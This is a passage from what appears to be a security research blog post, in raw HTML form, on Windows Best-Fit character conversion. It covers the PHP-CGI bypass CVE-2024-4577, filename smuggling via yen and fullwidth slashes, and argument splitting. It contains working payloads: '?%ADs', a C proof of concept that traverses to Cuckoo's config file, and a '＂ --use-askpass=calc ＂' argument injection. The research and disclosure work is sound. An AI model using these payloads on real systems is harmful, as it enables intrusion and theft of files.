        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;argv[%d] = %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The same Best-Fit behavior applies to both the arguments and the environment variables. Here’s what happens when we run this code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This happens because, during compilation, the compiler inserts several functions and links the CRT DLLs for you, which internally rely on ANSI Windows APIs. As a result, the same Best-Fit behavior is triggered implicitly.&lt;/p&gt;

&lt;p&gt;We keep talking about Best-Fit, but how does this quirky behavior actually work in the end?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;it-was-the-best-of-fit&quot;&gt;It was the Best of Fit&lt;/h2&gt;

&lt;p&gt;In Windows, “Best-Fit” character conversion is a way the operating system handles situations where it needs to convert characters from UTF-16 to ANSI, but the exact character doesn’t exist in the target code page.&lt;/p&gt;

&lt;p&gt;For instance, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;∞&lt;/code&gt; (&lt;a href=&quot;https://www.compart.com/en/unicode/U+221E&quot;&gt;U+221E&lt;/a&gt;) symbol isn’t part of the &lt;a href=&quot;https://en.wikipedia.org/wiki/Windows-1252#Codepage_layout&quot;&gt;Windows-1252 code page&lt;/a&gt;, so Microsoft decided to map it to the “&lt;strong&gt;closest&lt;/strong&gt;” character—&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt; (&lt;a href=&quot;https://worst.fit/mapping/#CP%3A1252%20FROM%3A0x221e&quot;&gt;🔍&lt;/a&gt;). Uh, okay. Yeah I guess they kinda look similar, but I thought they should be still completely different things…&lt;/p&gt;

&lt;p&gt;Anyway, obviously there’s no strict formula for Best-Fit mapping – what Microsoft does is more about making characters look, or even “feel” somewhat alike.&lt;/p&gt;

&lt;p&gt;Also, different language configurations (code pages) handle mappings differently. For instance, the yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00A5&lt;/code&gt;) is mapped to a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;) on the Japanese (932) code page, to a “Y” on the Central European (1250) code page, and remains unchanged on most other code pages. This variability will play a significant role in how exploits behave across different system settings.&lt;/p&gt;

&lt;p&gt;If you’re curious about the specifics, you can check out our &lt;a href=&quot;https://worst.fit/mapping/&quot;&gt;Best-fit Mapping Grepper&lt;/a&gt; tool or dive into the raw mapping data on &lt;a href=&quot;https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/readme.txt&quot;&gt;Unicode.org&lt;/a&gt; by yourself.&lt;/p&gt;

&lt;p&gt;Interestingly, during our research we found that this &lt;strong&gt;Best-Fit&lt;/strong&gt; behavior was already mentioned back in Black Hat USA 2009 during Chris Weber’s presentation, &lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-SLIDES.pdf&quot;&gt;“Unicode Security”&lt;/a&gt;. However, he only briefly touched on how this feature could be exploited to bypass simple blacklist.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(&lt;strong&gt;Updated&lt;/strong&gt;: After this article was published, we learned that &lt;a href=&quot;https://x.com/hasegawayosuke&quot;&gt;Yosuke HASEGAWA&lt;/a&gt; also mentioned this behavior at &lt;a href=&quot;https://www.blackhat.com/presentations/bh-jp-08/bh-jp-08-Hasegawa/BlackHat-japan-08-Hasegawa-Char-Encoding.pdf&quot;&gt;Black Hat Japan 2008&lt;/a&gt;, covering part of our Filename Smuggling in Japanese code page.)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;But this time, we’re taking big steps forward – showing how those sneaky Best-Fit conversions can operate on a &lt;strong&gt;system-wide level&lt;/strong&gt;, leading to even more impactful exploits, all unfolding right under your nose.&lt;/p&gt;

&lt;p&gt;Now, it’s time to turn this quirky behaviour into something more impactful: &lt;strong&gt;real WorstFit vulnerabilities&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;it-was-the-worst-of-fit--the-novel-attack-surface-on-windows&quot;&gt;It was the Worst of Fit – The novel attack surface on Windows&lt;/h2&gt;

&lt;p&gt;By delving into the Best-Fit feature, we can harness this unexpected character transformation as a brand-new attack surface on Windows systems. Here, we’ll explore three intriguing attack techniques that exploit this behavior: &lt;strong&gt;Filename Smuggling&lt;/strong&gt;, &lt;strong&gt;Argument Splitting&lt;/strong&gt; and &lt;strong&gt;Environment Variable Confusion&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Let’s dive into each of these techniques to see how this seemingly thoughtful (at least, from Microsoft’s perspective at the time) feature can lead to critical vulnerabilities!&lt;/p&gt;

&lt;h3 id=&quot;-the-nightmare-of-east-asia---cve-2024-4577&quot;&gt;🔥 The nightmare of East-Asia - CVE-2024-4577:&lt;/h3&gt;

&lt;p&gt;The first ever WorstFit attack is CVE-2024-4577. This vulnerability allows attackers to compromise any PHP-CGI server configured with Chinese or Japanese code pages using nothing more than a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?%ADs&lt;/code&gt; request!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: 932 (Japanese), 936 (Simplified Chinese), 950 (Traditional Chinese)&lt;br /&gt;
&lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;shy;&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00AD&quot;&gt;U+00AD&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Back in 2012, a vulnerability in PHP-CGI was discovered. The issue stemmed from Apache automatically treating the query string as the first argument for the CGI program. Exploitation was straightforward – argument injection. By appending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?-s&lt;/code&gt; to a request, attackers could leak the page’s source code. Furthermore, it’s also possible to achieve Remote Code Execution (RCE).&lt;/p&gt;

&lt;p&gt;Of course, PHP quickly patched the issue. The fix was also simple: stop parsing arguments if the query string starts with a dash.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;QUERY_STRING&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;=&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;cm&quot;&gt;/* ... omitted ... */&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decoded_qs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* skip leading spaces */&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;-&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;skip_getopt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ... omitted ... */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The patch worked well, and no one broke it for the past 12 years. However, while reviewing the patch, we couldn’t help but feel that this blacklist approach seemed weak. After some quick fuzzing, we discovered a simple bypass: appending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?%ADs&lt;/code&gt; to the query string effortlessly!&lt;/p&gt;

&lt;p&gt;As investigating more, we discovered that U+00AD (soft hyphen) is mapped to a dash (-) on Chinese (936, 950) and Japanese (932) code pages due to &lt;strong&gt;Best-Fit&lt;/strong&gt; behavior, which explains how the bypass works.&lt;/p&gt;

&lt;p&gt;This is the first time we’ve encountered the term “Best-Fit”. We found it super interesting, which motivated us to take a deeper look.&lt;/p&gt;

&lt;h3 id=&quot;-filename-smuggling&quot;&gt;🔥 Filename Smuggling&lt;/h3&gt;

&lt;p&gt;The next attack we would like to introduce is the WorstFit in the filename processing. Here, we focus on characters that mapped to either &lt;strong&gt;”/” (0x2F)&lt;/strong&gt; or &lt;strong&gt;”\” (0x5C)&lt;/strong&gt;, such as the currency symbol &lt;a href=&quot;https://en.wikipedia.org/wiki/Won_sign&quot;&gt;Yen (¥)&lt;/a&gt;, and &lt;a href=&quot;https://en.wikipedia.org/wiki/Yen_and_yuan_sign&quot;&gt;Won (₩)&lt;/a&gt; used in Japanese and Korean Code Pages, as well as the &lt;a href=&quot;https://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_(Unicode_block)&quot;&gt;fullwidth&lt;/a&gt; version of the (back-)slash in most Code Pages. You can check the affected characters and Code Pages on our &lt;a href=&quot;https://worst.fit/mapping/&quot;&gt;Best-fit Mapping Grepper&lt;/a&gt; tool!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x2f&quot;&gt;Characters mapped to “/” (0x2F)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x5c&quot;&gt;Characters mapped to “\” (0x5C)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Relevant API&lt;/strong&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcurrentdirectory&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCurrentDirectoryA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getcwd&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FindFirstFileA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/findfirst-functions?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;findfirst*&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfullpathnamea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetFullPathNameA&lt;/code&gt;&lt;/a&gt;, …&lt;br /&gt;
&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: 874, 125x, 932 (JP), 949 (KR)&lt;br /&gt;
&lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;／&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF0F&quot;&gt;U+FF0F&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＼&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF3C&quot;&gt;U+FF3C&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¥&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00A5&quot;&gt;U+00A5&lt;/a&gt; (JP), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;₩&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+20A9&quot;&gt;U+20A9&lt;/a&gt; (KR)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Let’s start with a simple case. In Chrome V8, the underlying implementation of its Developer Shell (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d8.exe&lt;/code&gt;) uses the ANSI API &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCurrentDirectoryA()&lt;/code&gt; to obtain the current working directory. This means that if we can have a working directory with malicious Unicode characters, these characters will automatically be converted into path traversal payloads when accessed via the ANSI API. As a result, it leads to an unintended file access.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/4.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;↑ Unintended file access on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:/windows/win.ini&lt;/code&gt;:&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Another case is the implementation of mruby &lt;a href=&quot;https://github.com/mruby/mruby/blob/3.3.0/mrbgems/mruby-dir/src/dir.c#L23&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dir.getwd()&lt;/code&gt;&lt;/a&gt; on Windows, the function relied on the ANSI version of CRT (C Runtime Library) &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_getcwd()&lt;/code&gt;&lt;/a&gt; to retrieve the current directory. This also means that we can pollute that function’s return value, leading to Path Traversal, too!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/5.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;↑ Pollute the return value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dir.getwd()&lt;/code&gt;:&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Of course, the above cases are still bugs instead of real vulnerabilities. Let’s take a look at some real-world cases!&lt;/p&gt;

&lt;h4 id=&quot;-case-study---path-traversal-to-rce-on-cuckoo-sandbox&quot;&gt;➤ Case Study - Path Traversal to RCE on Cuckoo Sandbox&lt;/h4&gt;

&lt;p&gt;Before diving into the vulnerability, it’s important to discuss Python first because it plays a significant role in this case! Conceptually, Python allows strings to be represented in two different types: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unicode&lt;/code&gt; in Python 2, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bytes&lt;/code&gt; in Python 3.&lt;/p&gt;

&lt;p&gt;To support both string representations, the implementation of filesystem access used a structure field to determine whether a target path was wide or narrow. If the string was narrow, the corresponding ANSI API was used to process the path, making it susceptible to the Best-Fit behavior. Although &lt;a href=&quot;https://peps.python.org/pep-0529/&quot;&gt;PEP 529&lt;/a&gt; later standardized the filesystem encoding on Windows to UTF-8, earlier versions — such as Python 2 and Python 3 (prior to version 3.6) — remained vulnerable to WorstFit attacks.&lt;/p&gt;

&lt;p&gt;With the above context in mind, let’s have our first target — &lt;a href=&quot;https://cuckoosandbox.org/index.html&quot;&gt;Cuckoo Sandbox&lt;/a&gt;, a well-known automated malware analysis platform. As one of the few open-source solutions for malware analysis in early days, it was the go-to choice for organizations building their own platforms, and for malware researchers seeking to extend its functionality. However, since Cuckoo has not been actively maintained for many years, the latest official version still relies on Python 2.7, which exposes it to our WorstFit Attack!&lt;/p&gt;

&lt;p&gt;Cuckoo consists of two main components: the &lt;strong&gt;Cuckoo Host&lt;/strong&gt; and the &lt;strong&gt;VM Cluster&lt;/strong&gt;. The uploaded samples are isolated within virtual machines to ensure they do not affect the Cuckoo. The components use a dedicated channel to synchronize the behaviors such as captured network packets, dropped files, and output logs with their own mechanism. However, since the Cuckoo Host is written in Python and relied on an outdated version, a dropped file with a Unicode filename can traverse the path on the Cuckoo Host!&lt;/p&gt;

&lt;p&gt;Here’s a simple Proof of Concept:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LPCWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filePath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;AAAA\u00a5..\u00a5..\u00a5..\u00a5..\u00a5..\u00a5conf\u00a5cuckoo.conf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFileW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;filePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CREATE_ALWAYS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILE_ATTRIBUTE_NORMAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the analysis has finished, users can view the logs and dropped files generated by the malware through the web interface. An attacker can trigger a file operation on Python by clicking the download button. The Cuckoo Host then processes a translated path, containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt; and sends sensitive data to the attacker.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The attacker can then download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cuckoo.conf&lt;/code&gt;, and gathered several sensitive information to calculate the Flask PIN code, ultimately achieving RCE on the Sandbox Host!&lt;/p&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/EeMcDT95WSM?si=NJ8xmmWNEICeq-d7&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-argument-splitting&quot;&gt;🔥 Argument Splitting&lt;/h3&gt;

&lt;p&gt;We can also exploit the WorstFit behavior in command line parsing by manipulating the output of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;. With this trick, even if you can control just a small part of an argument, that’s more than enough to inject as many arguments as you want!&lt;/p&gt;

&lt;p&gt;This time, we’re zeroing in on characters that map to either a double quote (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;, 0x22) or a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;, 0x5C). Once again, fullwidth characters come in handy here, and when it comes to backslashes, those currency symbols we talked about earlier make a comeback!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x22&quot;&gt;Characters mapped to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; (0x22)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x5c&quot;&gt;Characters mapped to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; (0x5C)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Relevant API&lt;/strong&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandlineA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-language/main-function-and-program-execution?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main()&lt;/code&gt;&lt;/a&gt;&lt;br /&gt;
&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: 874, 125x, 932 (JP), 949 (KR)&lt;br /&gt;
&lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＂&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF02&quot;&gt;U+FF02&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＼&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF3C&quot;&gt;U+FF3C&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¥&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00A5&quot;&gt;U+00A5&lt;/a&gt; (JP), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;₩&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+20A9&quot;&gt;U+20A9&lt;/a&gt; (KR)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Let’s circle back to the piece of code we discussed earlier. How might this seemingly simple snippet fail, and more importantly, how could an attacker exploit it?&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://example.tld/&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;path&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wget.exe -q &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The answer is quite simple. If an attacker provides the input: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＂ --use-askpass=calc ＂&lt;/code&gt;
It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;

&lt;p&gt;At this point, you might be thinking, &lt;em&gt;“Oh, it’s PHP messing up again, isn’t it? I know PHP always…”&lt;/em&gt; But nope – even switching to &lt;strong&gt;Node.js&lt;/strong&gt;, &lt;strong&gt;Rust&lt;/strong&gt;, or &lt;strong&gt;Python&lt;/strong&gt; doesn’t save you. Here’s an example in Python, and the same input works like a charm – this time on the latest version of Python, not just older ones:&lt;/p&gt;

